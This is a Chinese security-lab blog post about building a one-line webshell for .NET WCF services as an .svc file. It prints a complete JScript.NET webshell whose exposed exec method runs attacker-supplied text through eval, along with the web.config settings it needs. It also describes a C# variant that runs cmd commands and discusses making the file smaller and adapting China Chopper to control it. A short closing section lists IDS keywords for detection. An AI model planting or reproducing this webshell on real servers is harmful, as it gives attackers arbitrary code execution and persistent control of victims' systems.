探索基于.NET下实现一句话木马之SVC篇
===================================

**Ivan\@360云影实验室**

**2018年07月21日**

0x01 前言
=========

本文是探索.NET三驾马车实现一句话木马的完结篇，如果前两篇没有看的同学可以浏览安全客地址（ashx一句话
*https://www.anquanke.com/post/id/151960* 、 asmx一句话
*https://www.anquanke.com/post/id/152238*）或者云影实验室公众号的历史消息，至于这三篇文章包含的代码片段已经同步到笔者的[github](https://github.com/Ivan1ee)上，如果有需求请自取。
那么闲话少叙，回归正题。SVC是 .NET
WCF程序的扩展名至于有什么作用那还得先谈谈WCF。

0x02 简介和原理
===============

WCF (Windows Communication Foundation)
是微软为构建面向服务的应用程序所提供的统一编程模型，能够解决不同应用程序域，不同平台之间的通信问题。WCF统一了多重分布式技术：Webservice、.NetRemoting、.Net企业服务、微软的消息队列（MSMQ），在WCF的结构中有下面几个概念：

1.  契约（ServiceContract）:
    契约是属于一个服务公开的公共接口，定义了服务端公开的服务方法、使用的传输协议、可访问的地址以及传输的消息格式等等，简单的说契约的作用就是告诉我们能干什么；

2.  地址（Address）:
    在WCF框架中，每个服务都具有唯一的地址，其他服务或者客户端通过这个地址来访问到这个服务；

3.  绑定（Binding）:
    定义了服务与外部通信的方式。它由一组称为绑定元素的元素而构成，这些元素组合在一起形成通信基础结构；

4.  终结点（EndPoint）:
    终结点是用来发送或接收消息的，一个终结点由三个要素组成，分别是：地址、绑定和契约；

对于本文来说只需要掌握契约的使用即可，下面通过一个简单的demo来演示

| using System; using System.ServiceModel; namespace test { [ServiceContract] public interface IService1 { [OperationContract] string DoWork(); } public class TestService : IService1 { public string DoWork() { return DateTime.Now.ToString(); } } } |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


上面的代码中[ServiceContract]
是接口Iservice1声明的特性，表示这个是一个契约；[OperationContract]
在接口方法DoWork上声明表示该方法是一个对外的服务，远程客户端能够调用到这个方法；定义TestService类去实现接口，并且实现接口里的DoWork方法，方法体内返回当前的日期时间；简要的说明后通过Visual
Studio调试如下：

![](media/99f54ba2cec6d04a29123ff2c7b35243.png)

点击WCF测试客户端右侧 “ 调用“
成功返回了当前的时间结果，这就是一个简单的WCF程序的定义和调用。

0x03 SVC小马的实现 
===================

通常用IDE生成的WCF文件由三部分组成，如果要实现WCF的小马，需要将三部分整合到一个文件中，扩展名是svc。新建WCF的时候三个文件默认名分别为Service1.svc
、Service1.svc.cs 、IService.cs
，整合代码分两步走，第一步先将接口文件IService.cs里的代码块放入Service.svc.cs文件中；第二步将Service1.svc.cs文件和Service1.svc合并；
最终三块代码整合一起，再加上实现了创建aspx马儿和CMD执行命令的功能，俨然诞生了一个WCF的小马，代码如下：

![](media/9ca97f224fb02f58b79921c6c0869f4e.png)

输入ver命令，返回执行结果。

![](media/d5ca0986c584090adbab22da0f07cea2.png)

把文件部署到IIS7下然后访问 <http://IP/service2.svc?singleWsdl> ，

![](media/c95f1b32dcf7f0d54789c917cf8df36d.png)

看到这段wsdl中包含了定义的cmdShell方法，还有对应返回的webShellResponse这个xml元素节点，将来命令执行的结果全部位于webShellResult节点之间，若想可视化的
操作还需要借助SoapUI这款工具来实现调用，工具下载地址网上有很多，笔者下载的是5.2.1版本，

安装新建项目后选择添加 ”Add WSDL“

![](media/2ffc0e5dbf48b056bb5538c1db206151.png)

点击OK后可见左侧多出了代码里定义的两个方法，点击节点下的Request
按钮就可以发送请求测试了。

![](media/c0cd0d0d598d60e2193c7908f57758f4.png)

到此虽然小马已经实现，但不是笔者的目标，笔者期望的还是随便传入一句话就可以到达任意执行的目的，所以还得继续往下转化。

0x04 一句话的实现 
==================

根据C\#版本的小马加上之前两篇文章中利用Jscript.Net的语法就可以很容易写出一句话小马服务端，查看C\#中
ServiceContract元数据可以看出本质上就是ServiceContractAttribute，OperationContract对应的是
OperationContractAttribute。如下图

![](media/c0119300c80f821423b4fb75e2e88254.png)

![](media/d9d7b05355ea2131e1622bf87ae15f52.png)

在Jscript.Net中实现这两个功能的分类是WebMethodAttribute类和ScriptMethodAttribute类，最终写出一句话木马服务端代码：

| \<%\@ ServiceHost Language="JScript" Debug="true" Service="svcLessSpy" %\> import System; import System.Web; import System.IO; import System.ServiceModel; import System.Text; ServiceContractAttribute public class svcLessSpy { OperationContractAttribute public function exec(text : String) : String { return eval(text); } } |
|------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


打开浏览器输入 DateTime.Now.ToString() 成功打印出当前时间

![](media/e23acd143ec0221c7cada34f3c00c08a.png)

其实请求的数据是一条SOAP消息，也是一个普通的XML文档，但必须要包含Envelope
命名空间、不能包含DTD引用和XML处理指令；

![](media/9f002aae6cafc4f8474a1ceae2479de4.png)

Envelope元素是SOAP消息的根元素，它的存在就可认为这个XML是一个SOAP消息、Body元素包含准备传送到消息最终端点的数据，上面的tem:exec和tem:text元素是应用程序专用的元素,并不是标准SOAP的一部分，发送HTTP请求的时候只需修改tem:Ivan就可以实现任意代码执行，至此SVC版本的一句话小马也已经实现。这里还需要注意一点，web.config里必须要配置

| \<system.serviceModel\> \<behaviors\> \<serviceBehaviors\> \<behavior\> \<serviceMetadata httpGetEnabled="true"/\> \</behavior\> \</serviceBehaviors\> \</behaviors\> \<serviceHostingEnvironment multipleSiteBindingsEnabled="true" /\> \</system.serviceModel\> |
|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|


其中最关键的当属 httpGetEnabled = true
，如果不配置这个选项浏览的时候会看到如下的提示

![](media/42768123e489a9ef4d6540bc45d213d9.png)

好在遇到上述配置的概率不大，因开发环境下Visual
Studio会自动添加这个选项到配置文件中去，开发人员在部署的时候基于习惯会拷贝到生成环境下，所以大概率支持HTTP请求。可惜的是菜刀暂时不支持SOAP消息返回的数据格式，笔者考虑的解决方案重写客户端来支持SOAP消息返回；还有就是基于优化考虑将svcLessSpy.svc进一步压缩体积后只有339个字节。

![](media/3bc60df453938498ef13c69413302a4e.png)

0x05 防御措施
=============

1.  对于Web应用来说，尽量保证代码的安全性；

2.  对于IDS规则层面来说，上传的时候可以加入OperationContractAttribute、ServiceContractAttribute、eval等关键词的检测

0x06 小结
=========

1.  Svc大有替代asmx的趋势，也是微软未来主推的服务，相信会有越来越多的.NET应用程序支持WCF，svc一句话木马被攻击者恶意利用的概率也会越来越多;

2.  目前中国菜刀还不支持svc扩展，需要改进或者有条件的可以开发一款属于svc和asmx一句话木马专属定制的工具；

3.  文章的代码片段请参考 <https://github.com/Ivan1ee> ;

0x07 参考链接
=============

<https://docs.microsoft.com/en-us/dotnet/framework/wcf/getting-started-tutorial>

<https://www.cnblogs.com/oec2003/archive/2010/07/21/1782324.html>
